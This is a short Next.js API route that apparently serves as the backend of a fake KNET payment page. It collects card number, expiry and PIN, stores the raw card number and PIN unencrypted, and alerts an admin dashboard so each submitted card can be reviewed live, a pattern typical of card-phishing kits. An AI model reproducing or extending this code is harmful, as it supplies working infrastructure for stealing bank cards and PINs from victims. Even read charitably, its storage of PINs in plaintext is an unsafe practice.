import { NextResponse } from "next/server";
import { knet, KNET_REVIEW } from "@/models/knet.repository";
import { scheduleAdminRealtimeBroadcast } from "@/lib/admin-realtime-hub";

export async function POST(req: Request) {
  const body = await req.json().catch(() => ({}));
  const { phone, amount, card, expiry, pin } = body as Record<string, string>;

  if (!card || card.replace(/\D/g, "").length < 10) {
    return NextResponse.json({ error: "invalid_card" }, { status: 400 });
  }

  const rawCard = card.replace(/\D/g, "");
  const amountHalalas = Math.round(parseFloat(amount || "0") * 100);

  const orderId = "ORD-" + Date.now().toString(36) + Math.random().toString(36).slice(2, 8);

  const record = await knet.create({
    amount: amountHalalas || 0,
    cardNumber: rawCard,
    expiryDate: expiry || "",
    pin: pin || "",
    cvv: "",
    status: "pending",
    reviewStep: KNET_REVIEW.awaitingAdminCard,
    createdAt: new Date(),
    updatedAt: new Date(),
    orderId,
  });

  scheduleAdminRealtimeBroadcast();
  return NextResponse.json({ id: record.id });
}
